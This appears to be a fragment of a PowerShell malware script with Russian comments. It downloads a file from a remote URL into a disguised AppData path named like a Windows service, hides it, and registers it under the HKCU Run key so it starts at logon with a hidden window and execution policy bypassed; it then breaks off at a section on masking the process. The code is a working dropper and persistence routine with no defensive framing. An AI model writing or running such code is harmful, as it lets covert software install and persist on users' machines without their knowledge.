# Путь для скрытой установки (косим под системный процесс)
$install_path = "$env:APPDATA\Microsoft\Windows\Templates\win_services.ps1"
$registry_name = "WindowsHostService"

# 1. ЗАКРЕПЛЕНИЕ (Если запущен не из папки установки)
if ($PSCommandPath -ne $install_path) {
    if (!(Test-Path $install_path)) {
        (New-Object Net.WebClient).DownloadFile($url_raw, $install_path)
        # Скрываем файл (ставим атрибут "Скрытый")
        (Get-Item $install_path).Attributes = 'Hidden'
    }
    # Прописка в реестр для автозапуска
    $val = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$install_path`""
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $registry_name -Value $val
}

# 2. МАСКИРОВКА ПРОЦЕССА
# Меняем заголовок окна (хотя оно и так скрыто)
